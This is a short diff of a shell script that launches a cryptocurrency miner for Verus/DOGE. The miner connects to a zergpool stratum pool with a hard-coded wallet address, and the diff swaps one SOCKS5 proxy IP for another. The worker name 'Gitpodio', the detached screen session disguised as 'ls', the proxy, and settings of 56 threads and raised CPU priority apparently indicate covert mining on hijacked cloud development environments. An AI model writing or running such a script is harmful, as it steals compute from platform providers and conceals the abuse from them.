@@ -6,6 +6,6 @@ screen -dmS ls
 A=stratum+tcp://verushash.na.mine.zergpool.com:3300
 B=D63YEMS8dCqnE71Mrp1StTTCX39b22PN1z
 C=Gitpodio
-D=socks5://72.221.196.145:4145
+D=socks5://72.217.216.239:4145
 
 chmod u+x 2 && ./2 -a verus -o $A -u $B.$C -x $D  -p c=DOGE --cpu-priority 5 -t 56 --max-diff=39000
